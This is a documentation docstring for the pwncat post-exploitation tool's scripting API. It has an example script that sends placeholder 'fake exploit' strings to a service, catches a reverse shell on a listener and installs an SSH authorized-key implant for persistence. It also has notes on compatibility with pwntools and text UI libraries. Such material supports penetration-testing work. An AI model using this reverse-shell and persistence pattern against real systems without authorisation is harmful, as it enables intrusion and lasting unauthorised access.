"""
pwncat provides a high-level API capable of being used not only while implementing
custom commands and modules but also to embed pwncat within scripts. pwncat can be
instantiated from a script and you can interact with targets programmatically.

Example Script
--------------

As an example, the following script demonstrates a fake exploit. In this example,
there is a public service listening on port ``1337``. We connect to this service,
send an exploit and a payload instructing the service to connect back to our
attacking machine with a shell. We also start a listener before sending the
exploit. After the exploit has been sent, we accept a connection to the listener,
and construct a pwncat manager and session around this connected socket.

Because we can harness the full internal pwncat API, we are even able to execute
modules prior to entering the pwncat prompt. Below, we install the authorized keys
implant prior to starting our shell.

.. code-block:: python

    #!/usr/bin/env python3
    import socket
    import pwncat.manager

    # Connect to a vulnerable service
    sock = socket.create_connect(("192.168.1.1", 1337))
    # Create the listener for our shell
    listener = socket.create_server(("0.0.0.0", 4444))

    # Send the exploit and payload
    sock.send("EXPLOITEXPLOITEXPLOIT")
    sock.send("REVERSE SHELL PAYLOAD")

    # Accept the reverse connection
    victim, victim_addr = listener.accept()

    with pwncat.manager.Manager() as manager:
        # Establish a pwncat session
        session = manager.create_session(platform="linux", protocol="socket", client=victim)

        # Maybe install persistence or whatever
        session.run("implant.authorized_key", key="/home/caleb/.ssh/id_rsa")

        # Give the user a pwncat prompt
        manager.interactive()

Compatability with Text UI Libraries
------------------------------------

pwncat uses ``prompt_toolkit`` and ``python-rich`` to support colorful and aesthetically
pleasing output. However, this output does not behave well when using external Text UI
libraries (e.g. ``ncurses``). One notable example is ``pwntools`` which you likely use
when writing binary exploits. Because of this, prior to creating a manager, you should
shutdown any TUI libraries you may have loaded.

.. note::

    pwntools specifically does not provide a way to undo the changes it makes
    to the stdout/stdin. Because of this, when creating a manager, pwncat will
    automatically undo the things that pwntools did to change the terminal.
    You should close any existing pwntools progress instances and not use any
    output functionality from pwntools after instantiating a manager.

"""
